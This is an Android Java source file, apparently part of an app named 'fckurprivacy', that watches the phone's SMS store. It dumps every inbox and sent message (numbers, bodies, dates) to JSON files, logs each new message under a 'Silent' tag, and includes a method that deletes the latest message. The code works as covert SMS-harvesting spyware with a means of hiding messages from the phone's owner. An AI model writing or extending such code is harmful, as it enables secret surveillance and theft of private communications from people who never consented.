package com.vergermiya.harevost.fckurprivacy.SmsChecker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;

import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;

import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;

import org.json.JSONArray;
import org.json.JSONStringer;

import java.text.SimpleDateFormat;
import java.util.ArrayList;

/**
 * Created by harevost on 18-7-16.
 */

public class SmsObserver extends ContentObserver {

    private Context mContext;
    private Handler mHandler;
    private int mRunCount = 1;
    private int mCallbackCount;

    public static Uri SMS_INBOX = Uri.parse("content://sms/inbox");
    public static Uri SMS_SENT = Uri.parse("content://sms/sent");
    public static Uri SMS_ALL = Uri.parse("content://sms");

    public static SmsJson onChangeSms = new SmsJson();

    public SmsObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
        mHandler = handler;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {

        if (mCallbackCount % 3 == 0) { mCallbackCount = 0; }
        mCallbackCount += 1;

        ArrayList<SmsJson> allInboxSms = new ArrayList<>();
        ArrayList<SmsJson> allSentSms = new ArrayList<>();
        ArrayList<SmsJson> allSms = new ArrayList<>();

        Log.d("Sms onChange", "mRunCount=" + mRunCount);
        Log.d("Sms onChange", "mCallbackCount=" + mCallbackCount);

        if (mRunCount <= 1) {
            allInboxSms = querySmsJson(mContext, SMS_INBOX);
            allSentSms = querySmsJson(mContext, SMS_SENT);
            allSms = querySmsJson(mContext, SMS_ALL);
            for (SmsJson sms : allInboxSms) {
                Log.d("Sms onChange", "allInboxSms:" + sms);
            }

            for (SmsJson sms : allSentSms) {
                Log.d("Sms onChange", "allSentSms:" + sms);
            }

            JSONArray allSmsJsons = JsonBuilder.buildSmsJsons(allSms);
            FileSaver fileSaver = new FileSaver();
            fileSaver.saveFile("AllSms", ".json", allSmsJsons.toString());

        } else {
            if (mCallbackCount % 3 == 0) {
                SmsJson latestSms = getLatestSmsJson(mContext, SMS_ALL);
                String smsDate = latestSms.getDate();
                JSONStringer latestSmsJson = JsonBuilder.buildSmsJson(latestSms);
                Log.d("Sms onChange", "latestSms:" + latestSms);
                FileSaver fileSaver = new FileSaver();
                fileSaver.saveFile(smsDate, ".json", latestSmsJson.toString());
                onChangeSms = latestSms;
                Log.d("Silent", onChangeSms.toString());
            }
        }

        mRunCount += 1;
        onChangeSms = new SmsJson();
    }

    public static ArrayList<SmsJson> querySmsJson(Context context, Uri mUri) {
        ArrayList<SmsJson> smsJsons = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = mUri;

        String[] mProjection = new String[] {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        Cursor c = contentResolver.query(uri, mProjection, null, null, "date desc");

        if (c != null) {
            while (c.moveToNext()) {
                String phoneNumber = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));

                String smsThreadId = c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID));

                long smsDateLong = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String smsDate = dateFormat.format(smsDateLong);

                int smsTypeInt = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
                String[] smsType = {"inbox", "sent"};

                String smsBody = c.getString(c.getColumnIndex(Telephony.Sms.BODY));

                SmsJson mSmsJson = new SmsJson(phoneNumber, smsThreadId, smsDate, smsType[smsTypeInt - 1], smsBody);
                smsJsons.add(mSmsJson);
            }
        }
        c.close();
        return smsJsons;
    }

    public static void deleteLatestSms(Context context, Uri uri) {
        ContentResolver contentResolver = context.getContentResolver();

        String[] mProjection = new String[] {
                Telephony.Sms._ID,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        Cursor c = contentResolver.query(uri, mProjection, null, null, "date desc");
        if (c != null) {
            if (c.moveToFirst()) {
                String smsId = c.getString(c.getColumnIndex(Telephony.Sms._ID));
                contentResolver.delete(uri, "_id=?", new String[]{smsId + ""});
                Log.d("SmsJson", smsId + ":" + c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)));
            }
        }
        c.close();
    }

    public static SmsJson getLatestSmsJson(Context context, Uri uri) {
        SmsJson mSmsJson = new SmsJson();
        ArrayList<SmsJson> smsJsons = querySmsJson(context, uri);
        if (!smsJsons.isEmpty()) {
            mSmsJson = smsJsons.get(0);
        }
        return mSmsJson;
    }

}
